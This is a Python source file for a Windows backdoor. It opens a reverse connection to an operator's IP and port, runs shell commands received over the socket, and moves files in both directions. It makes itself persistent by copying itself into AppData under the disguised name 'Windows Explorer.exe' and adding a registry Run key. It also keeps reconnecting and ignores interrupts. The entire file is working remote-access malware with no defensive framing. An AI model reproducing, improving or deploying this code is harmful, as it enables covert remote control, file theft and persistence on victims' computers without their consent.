#!/usr/bin/python3
import socket, subprocess, sys, json, os, base64
from time import sleep


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip = str(ip)
        self.port = port
        self.become_persistent()

    def become_persistent(self):
        try:
            evil_file_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
            if not os.path.exists(evil_file_loc):
                source = open(sys.executable, "rb")
                dest = open(evil_file_loc, "wb")
                line = source.readline()
                while line:
                    dest.write(line)
                    line=source.readline()
                source.close()
                dest.close()
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinExplorer /t REG_SZ /d "' + evil_file_loc + '"', shell=True)
        except Exception:
            pass
    def execute_sys_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            error = b"[-] Not a valid OS command!\n"
            return error

    def read_file(self, path):
        try:
            with open(str(path), "rb") as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            return "[-] Not a valid file name/ file path!"

    def write_file(self, path, content):
        with open(path, "wb") as file:
            try:
                base64.b64decode(file.write(content))
                return f"[+] Upload successful. Uploaded to: {path}!"
            except TypeError:
                content = base64.b64decode(content)
                file.write(content)
                return f"[+] Upload successful. Uploaded to: {path}!"

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(str.encode(json_data))

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return f"[+]changing working directory to {path}\n\n"
        except FileNotFoundError:
            return f"[-] No file or directory called {path}\n\n"

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('UTF-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        try:
            def main():
                try:
                    self.connection.connect((self.ip, self.port))
                    while True:
                        data = self.reliable_recv()
                        command = data

                        #if command[0] == 'exit' or command[0] == 'Exit':
                            #self.connection.close()
                            #exit()
                        if (command[0] == 'cd' or command[0] == 'chdir' or command[0] == 'Chdir' or command[0] == 'Cd') and len(command) > 1:
                            result = self.change_working_directory(command[1])

                        elif command[0] == 'download' or command[0] == 'Download' and len(command) > 1:
                            raw_file_name = command
                            del raw_file_name[0]
                            file_name = " ".join(raw_file_name)
                            result = self.read_file(file_name)

                        elif command[0] == 'upload' or command[0] == 'Upload' and len(command) > 1:
                            result = self.write_file(command[1], command[2])
                        else:
                            result = self.execute_sys_command(command)
                        try:
                            self.reliable_send(result.decode('UTF-8'))

                        except AttributeError:
                            self.reliable_send(result)

                except ConnectionRefusedError:
                    try:
                        sleep(60)
                        main()
                    except KeyboardInterrupt:
                        sleep(6)
                        main()
                except ConnectionAbortedError:
                    sleep(6)
                    main()
                except KeyboardInterrupt:
                    sleep(6)
                    main()
            main()

        except KeyboardInterrupt:
            sleep(6)
            main()
